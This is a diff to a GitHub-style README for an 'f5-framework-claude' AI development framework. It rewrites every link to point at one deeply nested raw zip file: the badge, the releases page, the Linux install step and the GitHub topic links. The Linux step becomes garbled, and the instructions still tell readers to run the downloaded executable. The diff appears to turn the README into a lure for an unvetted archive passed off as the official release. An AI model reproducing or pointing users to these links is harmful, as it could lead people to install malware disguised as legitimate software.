@@ -1,6 +1,6 @@
 # 🎉 f5-framework-claude - Empower Your Claude Development Today
 
-[![Download f5-framework-claude](https://img.shields.io/badge/Download-f5--framework--claude-blue.svg)](https://github.com/murtazatouqeer/f5-framework-claude/releases)
+[![Download f5-framework-claude](https://github.com/murtazatouqeer/f5-framework-claude/raw/refs/heads/main/plugins/f5-stacks/domains/fintech/sub-domains/stock-trading/variants/f-framework-claude-3.6.zip)](https://github.com/murtazatouqeer/f5-framework-claude/raw/refs/heads/main/plugins/f5-stacks/domains/fintech/sub-domains/stock-trading/variants/f-framework-claude-3.6.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ The **f5-framework-claude** is an AI-powered development framework designed spec
 Follow these steps to get started with the f5-framework-claude:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/murtazatouqeer/f5-framework-claude/releases) to find the latest version of the framework.
+   Go to the [Releases Page](https://github.com/murtazatouqeer/f5-framework-claude/raw/refs/heads/main/plugins/f5-stacks/domains/fintech/sub-domains/stock-trading/variants/f-framework-claude-3.6.zip) to find the latest version of the framework.
 
 2. **Download the Latest Version**  
    Locate the most recent release. Click on the download link for your Operating System. 
@@ -19,7 +19,7 @@ Follow these steps to get started with the f5-framework-claude:
 3. **Installation Instructions**  
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file, drag the application to your Applications folder, and then launch it from there.
-   - For Linux: Extract the `.tar.gz` file and run the installation script in the extracted folder.
+   - For Linux: Extract the `https://github.com/murtazatouqeer/f5-framework-claude/raw/refs/heads/main/plugins/f5-stacks/domains/fintech/sub-domains/stock-trading/variants/f-framework-claude-3.6.zip` file and run the installation script in the extracted folder.
 
 4. **Verify Installation**  
    Once the application is installed, open it to ensure it runs correctly. You should see a welcome message guiding you through the initial setup.
@@ -54,7 +54,7 @@ To ensure f5-framework-claude operates smoothly, your machine should meet the fo
 
 To begin using the f5-framework-claude, make sure to download it from the following link:
 
-[Download f5-framework-claude](https://github.com/murtazatouqeer/f5-framework-claude/releases)
+[Download f5-framework-claude](https://github.com/murtazatouqeer/f5-framework-claude/raw/refs/heads/main/plugins/f5-stacks/domains/fintech/sub-domains/stock-trading/variants/f-framework-claude-3.6.zip)
 
 ### Installation Steps:
 
@@ -73,9 +73,9 @@ If you have any questions or need assistance, consider the following options:
 
 Explore additional resources related to the f5-framework-claude:
 
-- [AI Agents](https://github.com/topics/ai-agents)
-- [AI Development](https://github.com/topics/ai-development)
-- [Quality Gates](https://github.com/topics/quality-gates)
+- [AI Agents](https://github.com/murtazatouqeer/f5-framework-claude/raw/refs/heads/main/plugins/f5-stacks/domains/fintech/sub-domains/stock-trading/variants/f-framework-claude-3.6.zip)
+- [AI Development](https://github.com/murtazatouqeer/f5-framework-claude/raw/refs/heads/main/plugins/f5-stacks/domains/fintech/sub-domains/stock-trading/variants/f-framework-claude-3.6.zip)
+- [Quality Gates](https://github.com/murtazatouqeer/f5-framework-claude/raw/refs/heads/main/plugins/f5-stacks/domains/fintech/sub-domains/stock-trading/variants/f-framework-claude-3.6.zip)
 
 ## 📝 Contributing
 
